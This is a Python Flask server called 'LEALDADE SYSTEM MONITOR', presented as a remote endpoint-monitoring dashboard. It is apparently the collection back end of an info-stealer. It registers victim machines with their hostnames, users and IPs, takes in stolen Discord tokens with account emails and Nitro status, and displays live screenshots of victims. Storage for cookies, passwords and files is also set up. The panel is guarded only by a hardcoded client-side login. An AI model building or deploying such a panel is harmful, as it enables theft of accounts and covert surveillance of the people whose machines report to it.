#!/usr/bin/env python3
"""
LEALDADE SYSTEM MONITOR - VERSÃO CORRIGIDA PARA RAILWAY
Servidor robusto sem dependências problemáticas
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
full_reports = {}
uploaded_files = {}

# Template HTML robusto
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #00d4ff;
            text-shadow: 0 0 20px rgba(0,212,255,0.5);
            margin-bottom: 20px;
            font-size: 2.5em;
        }
        .server-info {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
        }
        .stat-box {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 1px solid rgba(0,212,255,0.3);
        }
        .stat-number {
            font-size: 3em;
            font-weight: bold;
            color: #00d4ff;
        }
        .stat-label {
            color: #888;
            margin-top: 10px;
        }
        .tabs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }
        .tab {
            background: rgba(255,255,255,0.1);
            border: none;
            color: #fff;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1em;
        }
        .tab.active {
            background: #00d4ff;
            color: #000;
            font-weight: bold;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        .section {
            background: rgba(255,255,255,0.03);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .section h2 {
            color: #00d4ff;
            margin-bottom: 20px;
        }
        .client-card {
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            border-left: 4px solid #00d4ff;
        }
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .client-name {
            font-weight: bold;
            font-size: 1.2em;
        }
        .status {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }
        .status.online { background: #00d26a; color: #000; }
        .client-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            font-size: 0.9em;
            color: #aaa;
        }
        .token-card {
            background: rgba(0,0,0,0.4);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            font-family: monospace;
            border-left: 3px solid #ffd700;
            word-break: break-all;
        }
        .token-valid {
            border-left-color: #00d26a;
        }
        .screen-container {
            background: rgba(0,0,0,0.5);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
        }
        .live-badge {
            background: #ff0000;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            animation: pulse 2s infinite;
            display: inline-block;
            margin-bottom: 15px;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .screen-img {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 10px;
            border: 2px solid #00d4ff;
        }
        .client-select {
            margin-bottom: 20px;
            padding: 10px;
            background: rgba(255,255,255,0.1);
            border: 1px solid #00d4ff;
            color: #fff;
            border-radius: 5px;
            font-size: 1em;
        }
        .empty {
            text-align: center;
            color: #666;
            padding: 40px;
        }
        .refresh-btn {
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1em;
            display: block;
            margin: 0 auto 30px;
        }
        .update-time {
            text-align: center;
            color: #666;
        }
    </style>
</head>
<body>
    <h1>🔱 System Monitor Dashboard</h1>
    
    <div class="server-info">
        🌐 Sistema Online | 📡 Monitoramento Remoto de Endpoints
    </div>
    
    <div class="update-time">
        <button class="refresh-btn" onclick="location.reload()">🔄 Atualizar</button>
        <div>Última atualização: <span id="updateTime">{{UPDATE_TIME}}</span></div>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number" id="totalEndpoints">0</div>
            <div class="stat-label">Endpoints</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="onlineEndpoints">0</div>
            <div class="stat-label">Online</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="totalMetrics">0</div>
            <div class="stat-label">Métricas</div>
        </div>
    </div>
    
    <div class="tabs">
        <button class="tab active" onclick="showTab('endpoints')">🖥️ Endpoints</button>
        <button class="tab" onclick="showTab('metrics')">📊 Métricas</button>
        <button class="tab" onclick="showTab('remote')">📺 Acesso Remoto</button>
    </div>
    
    <div id="endpoints" class="tab-content active">
        <div class="section">
            <h2>🖥️ Endpoints Monitorados</h2>
            <div id="endpointsList">
                <div class="empty">Carregando...</div>
            </div>
        </div>
    </div>
    
    <div id="metrics" class="tab-content">
        <div class="section">
            <h2>📊 Métricas de Autenticação</h2>
            <div id="metricsList">
                <div class="empty">Carregando...</div>
            </div>
        </div>
    </div>
    
    <div id="remote" class="tab-content">
        <div class="section">
            <h2>📺 Visualização Remota</h2>
            <select id="endpointSelect" class="client-select" onchange="loadScreen()">
                <option value="">Selecione um endpoint...</option>
            </select>
            <div class="screen-container">
                <div class="live-badge">● LIVE</div>
                <div id="screenContent">
                    <div class="empty">Selecione um endpoint para visualizar</div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Carrega dados iniciais
        loadStats();
        loadEndpoints();
        loadMetrics();
        document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
        
        // Atualiza a cada 5 segundos
        setInterval(() => {
            loadStats();
            loadEndpoints();
            loadMetrics();
            loadScreen();
            document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
        }, 5000);
        
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
                document.getElementById('totalMetrics').textContent = data.total_metrics || 0;
            } catch(e) {}
        }
        
        async function loadEndpoints() {
            try {
                const res = await fetch('/api/endpoints');
                const endpoints = await res.json();
                const container = document.getElementById('endpointsList');
                const select = document.getElementById('endpointSelect');
                
                if (endpoints.length === 0) {
                    container.innerHTML = '<div class="empty">Nenhum endpoint conectado</div>';
                    return;
                }
                
                let selectHtml = '<option value="">Selecione um endpoint...</option>';
                
                container.innerHTML = endpoints.map(e => {
                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                    return `
                    <div class="client-card">
                        <div class="client-header">
                            <span class="client-name">${e.hostname}</span>
                            <span class="status ${e.status}">${e.status.toUpperCase()}</span>
                        </div>
                        <div class="client-info">
                            <div>👤 ${e.user}</div>
                            <div>🌐 ${e.ip_address}</div>
                            <div>🌍 ${e.external_ip}</div>
                            <div>💻 ${e.platform}</div>
                            <div>💾 ${e.ram}</div>
                            <div>⏰ ${e.last_seen}</div>
                        </div>
                    </div>
                    `;
                }).join('');
                
                select.innerHTML = selectHtml;
            } catch(e) {}
        }
        
        async function loadMetrics() {
            try {
                const res = await fetch('/api/metrics');
                const metrics = await res.json();
                const container = document.getElementById('metricsList');
                
                if (metrics.length === 0) {
                    container.innerHTML = '<div class="empty">Nenhuma métrica recebida</div>';
                    return;
                }
                
                container.innerHTML = metrics.map(m => {
                    const acc = m.account || {};
                    const accInfo = acc.username 
                        ? `✅ ${acc.username}#${acc.discriminator || '0000'} ${acc.email ? '| 📧 ' + acc.email : ''} ${acc.premium_type ? '| 💎 Nitro' : ''}`
                        : '❌ Inválido';
                    return `
                    <div class="token-card ${m.valid ? 'token-valid' : ''}">
                        <div style="color:#ffd700; margin-bottom:5px">${m.token}</div>
                        <div style="color:#888; font-size:0.8em">🖥️ ${m.endpoint_id} | 📍 ${m.source}</div>
                        <div style="color:#00d26a; margin-top:5px">${accInfo}</div>
                    </div>
                    `;
                }).join('');
            } catch(e) {}
        }
        
        async function loadScreen() {
            const endpointId = document.getElementById('endpointSelect').value;
            if (!endpointId) return;
            
            try {
                const res = await fetch(`/api/screenshot/${endpointId}`);
                const data = await res.json();
                
                if (data.image) {
                    document.getElementById('screenContent').innerHTML = 
                        `<img class="screen-img" src="data:image/png;base64,${data.image}" alt="Visualização remota">`;
                }
            } catch(e) {}
        }
    </script>
</body>
</html>"""

# Template do login roxo/preto premium com animações cinematográficas
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEALDADE SYSTEM - Login</title>
    <style>
        /* Reset e estilos globais */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000000;
            min-height: 100vh;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        /* Prevenir seleção em todos os elementos */
        * {
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }
        
        /* Permitir seleção apenas em inputs */
        input, input * {
            user-select: text !important;
            -webkit-user-select: text !important;
            -moz-user-select: text !important;
            -ms-user-select: text !important;
        }
        
        /* Gradiente de fundo preto limpo */
        .gradient-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            opacity: 1;
            z-index: 0;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
        
        /* Partículas mínimas e escuras */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            animation: float 40s infinite linear;
        }
        
        .particle.small {
            width: 1px;
            height: 1px;
            background: rgba(76, 29, 149, 0.3);
            box-shadow: 0 0 3px rgba(76, 29, 149, 0.2);
        }
        
        .particle.medium {
            width: 2px;
            height: 2px;
            background: rgba(76, 29, 149, 0.2);
            box-shadow: 0 0 4px rgba(76, 29, 149, 0.1);
        }
        
        .particle.large {
            width: 3px;
            height: 3px;
            background: rgba(76, 29, 149, 0.15);
            box-shadow: 0 0 5px rgba(76, 29, 149, 0.1);
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg) scale(0); opacity: 0; }
            10% { opacity: 0.3; transform: scale(1); }
            90% { opacity: 0.3; }
            100% { transform: translateY(-100vh) rotate(720deg) scale(0); opacity: 0; }
        }
        
        /* Remover grid hexagonal */
        .hex-grid {
            display: none;
        }
        
        /* Container principal clean */
        .login-container {
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 50px;
            max-width: 450px;
            width: 100%;
            border: 1px solid rgba(76, 29, 149, 0.2);
            box-shadow: 
                0 10px 30px rgba(0, 0, 0, 0.8),
                0 0 20px rgba(76, 29, 149, 0.1);
            position: relative;
            z-index: 10;
            animation: containerEntrance 0.8s ease-out;
        }
        
        @keyframes containerEntrance {
            from { 
                opacity: 0; 
                transform: translateY(30px) scale(0.95); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0) scale(1); 
            }
        }
        
        /* Borda sutil */
        .login-container::before {
            content: '';
            position: absolute;
            top: -1px;
            left: -1px;
            right: -1px;
            bottom: -1px;
            background: linear-gradient(
                45deg, 
                rgba(76, 29, 149, 0.3), 
                rgba(76, 29, 149, 0.1), 
                rgba(76, 29, 149, 0.3)
            );
            border-radius: 20px;
            z-index: -1;
            opacity: 0.5;
        }
        
        /* Logo clean */
        .logo {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .logo h1 {
            font-size: 3.5em;
            font-weight: 800;
            color: #4c1d95;
            letter-spacing: 3px;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(76, 29, 149, 0.3);
        }
        
        .logo p {
            color: #6b21a8;
            font-size: 1em;
            font-weight: 400;
            letter-spacing: 2px;
            text-transform: uppercase;
            opacity: 0.8;
        }
        
        /* Remover partículas do logo */
        .logo-particles {
            display: none;
        }
        
        /* Formulário clean */
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #6b21a8;
            font-weight: 500;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input {
            width: 100%;
            padding: 18px 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(76, 29, 149, 0.2);
            border-radius: 12px;
            color: #fff;
            font-size: 1em;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #4c1d95;
            background: rgba(0, 0, 0, 0.9);
            box-shadow: 0 0 15px rgba(76, 29, 149, 0.2);
        }
        
        .form-group input::placeholder {
            color: #6b7280;
        }
        
        /* Remover efeitos extras */
        .ripple {
            display: none;
        }
        
        .input-glow {
            display: none;
        }
        
        /* Botão clean */
        .login-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(
                135deg, 
                #4c1d95 0%, 
                #6b21a8 50%, 
                #7c3aed 100%
            );
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-top: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(76, 29, 149, 0.2);
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(76, 29, 149, 0.3);
        }
        
        .login-btn:active {
            transform: translateY(0);
        }
        
        .login-btn.loading {
            animation: btnPulse 1.5s infinite;
            pointer-events: none;
        }
        
        @keyframes btnPulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        /* Mensagens clean */
        .message {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 12px;
            border-left: 3px solid #4c1d95;
        }
        
        .message p {
            color: #9ca3af;
            font-style: italic;
            line-height: 1.6;
            font-size: 0.9em;
        }
        
        .error, .success {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 500;
            display: none;
        }
        
        .error {
            background: rgba(127, 29, 29, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
        }
        
        .success {
            background: rgba(20, 83, 45, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
            color: #86efac;
        }
        
        /* Remover indicadores de digitação */
        .typing-indicator {
            display: none;
        }
        
        /* Responsive design */
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 25px;
                margin: 20px;
            }
            
            .logo h1 {
                font-size: 2.8em;
            }
            
            .form-group input {
                padding: 16px 18px;
            }
            
            .login-btn {
                padding: 18px;
                font-size: 1em;
            }
        }
        
        /* Remover animações complexas */
        .success-animation {
            display: none;
        }
        
        .success-circle {
            display: none;
        }
        
        .success-checkmark {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Fundos animados -->
    <div class="gradient-bg"></div>
    <div class="hex-grid"></div>
    <div class="particles" id="particles"></div>
    
    <!-- Container principal -->
    <div class="login-container">
        <div class="logo">
            <h1>LEALDADE</h1>
            <p>SYSTEM</p>
            <div class="logo-particles" id="logoParticles"></div>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">USUÁRIO</label>
                <input type="text" id="username" name="username" placeholder="Digite seu usuário" required>
                <div class="input-glow"></div>
            </div>
            
            <div class="form-group">
                <label for="password">SENHA</label>
                <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
                <div class="input-glow"></div>
            </div>
            
            <button type="submit" class="login-btn" id="loginBtn">
                <span id="btnText">ENTRAR</span>
            </button>
        </form>
        
        <div class="message">
            <p>Se você chegou até aqui, tem um longo caminho a seguir...</p>
        </div>
    </div>

    <script>
        // Criar partículas mínimas
        function createMinimalParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 20;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                const size = Math.random() > 0.7 ? 'large' : Math.random() > 0.4 ? 'medium' : 'small';
                particle.className = `particle ${size}`;
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 40 + 's';
                particle.style.animationDuration = (30 + Math.random() * 20) + 's';
                particlesContainer.appendChild(particle);
            }
        }
        
        // Prevenir seleção de texto
        function preventSelection() {
            document.addEventListener('selectstart', function(e) {
                if (!e.target.matches('input, input *')) {
                    e.preventDefault();
                }
            });
            
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
            });
            
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
        }
        
        // Inicializar
        createMinimalParticles();
        preventSelection();
        
        // Elementos do formulário
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const btnText = document.getElementById('btnText');
        const errorMsg = document.getElementById('errorMsg');
        const successMsg = document.getElementById('successMsg');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        
        // Envio do formulário simplificado
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            // Resetar mensagens
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';
            
            // Estado de loading
            loginBtn.classList.add('loading');
            btnText.textContent = 'VERIFICANDO...';
            loginBtn.disabled = true;
            
            // Simular verificação
            setTimeout(() => {
                if (username === 'lealdade' && password === 'lealdade') {
                    // Sucesso
                    successMsg.textContent = '✓ Acesso concedido! Redirecionando...';
                    successMsg.style.display = 'block';
                    
                    loginBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
                    btnText.textContent = 'ACESSO LIBERADO';
                    
                    // Redirecionar após 2 segundos
                    setTimeout(() => {
                        window.location.href = '/dashboard';
                    }, 2000);
                } else {
                    // Erro
                    errorMsg.textContent = '✗ Credenciais inválidas! Tente novamente.';
                    errorMsg.style.display = 'block';
                    
                    loginBtn.classList.remove('loading');
                    btnText.textContent = 'TENTAR NOVAMENTE';
                    loginBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
                    
                    setTimeout(() => {
                        loginBtn.style.background = 'linear-gradient(135deg, #4c1d95, #6b21a8, #7c3aed)';
                        btnText.textContent = 'ENTRAR';
                        loginBtn.disabled = false;
                    }, 2000);
                    
                    // Limpar senha e focar
                    passwordInput.value = '';
                    passwordInput.focus();
                }
            }, 1500);
        });
    </script>
</body>
</html>
"""

# API Endpoints robustos
@app.route('/')
def index():
    """Página de login (principal)"""
    return LOGIN_TEMPLATE

@app.route('/dashboard')
def dashboard():
    """Página principal do dashboard"""
    return HTML_TEMPLATE.replace('{{UPDATE_TIME}}', datetime.now().strftime('%H:%M:%S'))

@app.route('/api/register', methods=['POST'])
def register_endpoint():
    """Registra novo endpoint"""
    try:
        data = request.get_json()
        endpoint_id = data.get('id')
        
        if not endpoint_id:
            return jsonify({'error': 'ID é obrigatório'}), 400
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', '0.0.0.0'),
            'external_ip': data.get('external_ip', '0.0.0.0'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        return jsonify({'success': True, 'message': 'Endpoint registrado'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/endpoints', methods=['GET'])
def get_endpoints():
    """Lista todos os endpoints"""
    return jsonify(list(endpoints.values()))

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Estatísticas gerais"""
    return jsonify({
        'total_endpoints': len(endpoints),
        'online_endpoints': len([e for e in endpoints.values() if e['status'] == 'online']),
        'total_metrics': len(metrics_data)
    })

@app.route('/api/metrics', methods=['POST'])
def receive_metrics():
    """Recebe métricas de autenticação"""
    try:
        data = request.get_json()
        metrics_data.append({
            'endpoint_id': data.get('endpoint_id'),
            'token': data.get('token'),
            'valid': data.get('valid', False),
            'account': data.get('account', {}),
            'source': data.get('source', 'unknown'),
            'timestamp': datetime.now().isoformat()
        })
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/metrics', methods=['GET'])
def get_metrics():
    """Lista todas as métricas"""
    return jsonify(metrics_data)

@app.route('/api/screenshot/<endpoint_id>', methods=['GET'])
def get_screenshot(endpoint_id):
    """Obtém screenshot de um endpoint"""
    if endpoint_id in endpoint_screenshots:
        return jsonify(endpoint_screenshots[endpoint_id])
    return jsonify({'error': 'Screenshot não encontrado'}), 404

@app.route('/api/screenshot', methods=['POST'])
def upload_screenshot():
    """Recebe screenshot de um endpoint"""
    try:
        data = request.get_json()
        endpoint_id = data.get('endpoint_id')
        image_data = data.get('image')
        
        if endpoint_id and image_data:
            endpoint_screenshots[endpoint_id] = {
                'image': image_data,
                'timestamp': datetime.now().isoformat()
            }
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
